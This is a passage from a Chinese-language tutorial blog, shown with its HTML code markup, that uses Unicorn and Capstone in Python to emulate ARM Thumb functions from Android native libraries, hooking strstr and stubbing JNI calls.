class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印寄存器内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出指针所指向的地址的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用add(int a,int b)函数  ==&gt;  两个参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb1</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x1264C</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x1264C</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    sp=address+size-<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)   <span class="comment">#SP寄存器赋值</span></span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x1</span>)  <span class="comment">#寄存器赋值</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    addrstart=address+<span class="number">0x0001264c</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x1265e</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用add_six(int a,int b,int c,int d,int e,int f) ==&gt; 六个参数需要用到栈</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb2</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x12660</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x12660</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    sp=address+size-<span class="number">16</span>                     </span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)   <span class="comment">#sp寄存器赋值</span></span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#寄存器赋值</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x1</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2, <span class="number">0x3</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R3, <span class="number">0x4</span>)</span><br><span class="line">    mu.mem_write(sp + <span class="number">4</span>, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x6</span>))  <span class="comment">#两个参数要入栈</span></span><br><span class="line">    mu.mem_write(sp, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x5</span>))</span><br><span class="line">    <span class="comment">#因为代码开始处有个 push &#123;lr&#125;，保持堆栈平衡</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_LR, <span class="number">0x445</span> + address)  </span><br><span class="line">    </span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    addrstart=address+<span class="number">0x12660</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x126B0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb1()</span><br><span class="line">    testthumb2()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印寄存器内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出指针所指向的地址的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address ==<span class="number">0x1000</span>+<span class="number">0x126C8</span>:   <span class="comment">#当运行到strstr()函数时</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;运行到strstr&quot;</span>)</span><br><span class="line">        <span class="comment">#参看strstr的参数地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span> % (<span class="number">0</span>, mu.reg_read(<span class="number">66</span>)))  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span> % (<span class="number">1</span>, mu.reg_read(<span class="number">67</span>)))</span><br><span class="line">        <span class="comment">#打印两个参数字符串</span></span><br><span class="line">        r0value=readstring(mu,mu.reg_read(arm_const.UC_ARM_REG_R0))</span><br><span class="line">        r1value = readstring(mu, mu.reg_read(arm_const.UC_ARM_REG_R1))</span><br><span class="line">        <span class="built_in">print</span>(r0value+<span class="string">&#x27;----------&#x27;</span>+r1value)</span><br><span class="line">        <span class="comment">#自己实现strstr()操作</span></span><br><span class="line">        index = r0value.find(r1value)</span><br><span class="line">        <span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, index)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call strstr------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用执行strstr(char *a,char *b)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_strstr</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x12698</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x12698</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#在开辟一个空间 存放一个字符串</span></span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line">    mu.mem_write(address+size+<span class="number">0x1000</span>,<span class="string">b&quot;flag4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sp=address+size-<span class="number">1000</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,address+size+<span class="number">0x1000</span>)  <span class="comment">#存放指針指向&#x27;flag4&#x27;</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2, <span class="number">0x3</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R3, <span class="number">0x4</span>)</span><br><span class="line">    mu.mem_write(sp + <span class="number">4</span>, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x6</span>))</span><br><span class="line">    mu.mem_write(sp, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x5</span>))</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_LR, <span class="number">0x445</span> + address)</span><br><span class="line">    </span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    addrstart=address+<span class="number">0x12698</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x12714</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)    </span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_strstr()</span><br></pre></td></tr></table></figure><h2 id="第四课时"><a href="#第四课时" class="headerlink" title="第四课时"></a>第四课时</h2><h4 id="调用jni接口函数"><a href="#调用jni接口函数" class="headerlink" title="调用jni接口函数"></a>调用jni接口函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicorn.arm_const</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印寄存器纸</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">      </span><br><span class="line"><span class="comment">#输出指针所指向的地址的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">0</span> <span class="keyword">and</span> address&lt;=<span class="number">300</span>*<span class="number">4</span>:</span><br><span class="line">        index=address/<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">676</span>/<span class="number">4</span>:  <span class="comment">#看在jninativeinterface的位置</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars-----------------&quot;</span>)</span><br><span class="line">            r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            content=readstring(mu,r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value)+<span class="string">&#x27;-----&#x27;</span>+content+<span class="string">&#x27;-----&#x27;</span>+<span class="built_in">str</span>(r2value))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars over-----------------&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">668</span>/<span class="number">4</span>:  <span class="comment">#看在jninativeinterface的位置</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF-----------------&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            content = readstring(mu, r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value) + <span class="string">&#x27;-----&#x27;</span> + content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF over-----------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jni interface------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_jni</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse04.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x424</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x424</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">    JNIFUNCTIONLISTBASE=<span class="number">0x0</span></span><br><span class="line">    JNIFUNCTIONLISTSIZE=<span class="number">0x1000</span></span><br><span class="line">    JNINATIVEINTERFACE=<span class="number">301</span></span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>, <span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment">#初始化jni接口中每个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#push &#123;lr&#125;  pop &#123;pc&#125;</span></span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>+JNIFUNCTIONLISTBASE,<span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment">#初始化jninativeinterface结构体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">600</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>,struct.pack(<span class="string">&quot;I&quot;</span>,(i-<span class="number">300</span>)*<span class="number">4</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#初始化jnienv* env</span></span><br><span class="line">    jnienv_pointer=<span class="number">601</span>*<span class="number">4</span></span><br><span class="line">    mu.mem_write(jnienv_pointer,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">300</span>*<span class="number">4</span>))  <span class="comment">#env指针</span></span><br><span class="line"></span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># bx lr 消除__android_log_print干扰</span></span><br><span class="line">    mu.mem_write(address+<span class="number">0x4f8</span>,<span class="string">b&#x27;\x1e\xff\x2f\xe1&#x27;</span>)   </span><br><span class="line">    <span class="comment">#或者 mu.mem_write(address +0x448, b&#x27;\x00\xbf\x00\xbf&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    mu.mem_write(address+size+<span class="number">0x1000</span>,<span class="string">b&#x27;imtestfromjni&#x27;</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,jnienv_pointer)  <span class="comment">#存放指針地址</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x0</span>)  <span class="comment">#没用到 设0即可</span></span><br><span class="line">    